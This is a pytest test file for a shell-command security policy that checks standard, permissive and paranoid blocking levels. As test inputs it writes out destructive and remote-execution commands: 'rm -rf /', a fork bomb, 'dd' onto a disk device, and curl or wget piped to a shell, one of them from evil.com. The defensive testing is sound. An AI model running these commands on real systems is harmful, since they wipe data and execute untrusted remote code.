"""Tests for SecurityPolicy and pattern blocking."""

from __future__ import annotations

import pytest

from safeshell.security.policy import (
    DANGEROUS_PATTERNS,
    SecurityPolicy,
    SecurityViolation,
)
from safeshell._types import SecurityLevel


class TestSecurityPolicy:
    """Tests for SecurityPolicy class."""

    def test_standard_policy_blocks_rm_rf_root(self) -> None:
        """Standard policy should block rm -rf /."""
        policy = SecurityPolicy.standard()
        with pytest.raises(SecurityViolation) as exc_info:
            policy.check_command("rm -rf /")
        assert "root" in str(exc_info.value).lower()

    def test_standard_policy_blocks_rm_rf_home(self) -> None:
        """Standard policy should block rm -rf ~."""
        policy = SecurityPolicy.standard()
        with pytest.raises(SecurityViolation):
            policy.check_command("rm -rf ~")

    def test_standard_policy_blocks_curl_pipe_sh(self) -> None:
        """Standard policy should block curl | sh."""
        policy = SecurityPolicy.standard()
        with pytest.raises(SecurityViolation) as exc_info:
            policy.check_command("curl http://example.com/script.sh | sh")
        assert "remote code execution" in str(exc_info.value).lower()

    def test_standard_policy_blocks_curl_pipe_bash(self) -> None:
        """Standard policy should block curl | bash."""
        policy = SecurityPolicy.standard()
        with pytest.raises(SecurityViolation):
            policy.check_command("curl http://evil.com | bash")

    def test_standard_policy_blocks_wget_pipe_sh(self) -> None:
        """Standard policy should block wget | sh."""
        policy = SecurityPolicy.standard()
        with pytest.raises(SecurityViolation):
            policy.check_command("wget -O - http://example.com | sh")

    def test_standard_policy_blocks_fork_bomb(self) -> None:
        """Standard policy should block fork bombs."""
        policy = SecurityPolicy.standard()
        with pytest.raises(SecurityViolation):
            policy.check_command(":(){ :|:& };:")

    def test_standard_policy_blocks_sudo(self) -> None:
        """Standard policy should block sudo."""
        policy = SecurityPolicy.standard()
        with pytest.raises(SecurityViolation):
            policy.check_command("sudo apt update")

    def test_standard_policy_blocks_dd_to_disk(self) -> None:
        """Standard policy should block dd to disk devices."""
        policy = SecurityPolicy.standard()
        with pytest.raises(SecurityViolation):
            policy.check_command("dd if=/dev/zero of=/dev/sda")

    def test_standard_policy_allows_safe_commands(self) -> None:
        """Standard policy should allow safe commands."""
        policy = SecurityPolicy.standard()
        # These should not raise
        assert policy.check_command("ls -la") == "ls -la"
        assert policy.check_command("cat /etc/passwd") == "cat /etc/passwd"
        assert policy.check_command("grep -r 'pattern' .") == "grep -r 'pattern' ."
        assert policy.check_command("find . -name '*.py'") == "find . -name '*.py'"

    def test_standard_policy_allows_safe_rm(self) -> None:
        """Standard policy should allow safe rm commands."""
        policy = SecurityPolicy.standard()
        # rm in a subdirectory should be allowed
        assert policy.check_command("rm -rf ./temp") == "rm -rf ./temp"
        assert policy.check_command("rm file.txt") == "rm file.txt"

    def test_permissive_policy_allows_dangerous_commands(self) -> None:
        """Permissive policy should allow dangerous commands."""
        policy = SecurityPolicy.permissive()
        # Should not raise
        assert policy.check_command("rm -rf /") == "rm -rf /"
        assert policy.check_command("curl http://x | sh") == "curl http://x | sh"

    def test_paranoid_policy_blocks_unlisted_commands(self) -> None:
        """Paranoid policy should block commands not in allowlist."""
        policy = SecurityPolicy.paranoid(allowed={"ls", "cat"})
        with pytest.raises(SecurityViolation) as exc_info:
            policy.check_command("grep pattern file")
        assert "allowlist" in str(exc_info.value).lower()

    def test_paranoid_policy_allows_listed_commands(self) -> None:
        """Paranoid policy should allow commands in allowlist."""
        policy = SecurityPolicy.paranoid(allowed={"ls", "cat", "grep"})
        assert policy.check_command("ls -la") == "ls -la"
        assert policy.check_command("cat file.txt") == "cat file.txt"
        assert policy.check_command("grep pattern file") == "grep pattern file"

    def test_paranoid_policy_handles_absolute_paths(self) -> None:
        """Paranoid policy should handle absolute paths in commands."""
        policy = SecurityPolicy.paranoid(allowed={"ls", "cat"})
        # /bin/ls should match "ls" in allowlist
        assert policy.check_command("/bin/ls -la") == "/bin/ls -la"

    def test_paranoid_policy_handles_env_vars(self) -> None:
        """Paranoid policy should handle env var prefixes."""
        policy = SecurityPolicy.paranoid(allowed={"ls", "cat"})
        # Should skip env vars and check the actual command
        assert policy.check_command("FOO=bar ls -la") == "FOO=bar ls -la"

    def test_add_blocked_pattern(self) -> None:
        """Should be able to add custom blocked patterns."""
        policy = SecurityPolicy.standard()
        policy.add_blocked_pattern(r"\bmy_dangerous_cmd\b", "Custom dangerous command")

        with pytest.raises(SecurityViolation):
            policy.check_command("my_dangerous_cmd --flag")

    def test_add_allowed_command(self) -> None:
        """Should be able to add commands to allowlist."""
        policy = SecurityPolicy.paranoid(allowed={"ls"})
        policy.add_allowed_command("cat")

        # Should now work
        assert policy.check_command("cat file.txt") == "cat file.txt"


class TestDangerousPatterns:
    """Tests for the DANGEROUS_PATTERNS list."""

    def test_patterns_are_compiled(self) -> None:
        """All patterns should be compiled regex objects."""
        import re

        for pattern, reason in DANGEROUS_PATTERNS:
            assert isinstance(pattern, re.Pattern)
            assert isinstance(reason, str)
            assert len(reason) > 0

    def test_patterns_have_unique_reasons(self) -> None:
        """Each pattern should have a descriptive reason."""
        reasons = [reason for _, reason in DANGEROUS_PATTERNS]
        # At least half should be unique (some may share category)
        assert len(set(reasons)) >= len(DANGEROUS_PATTERNS) // 2
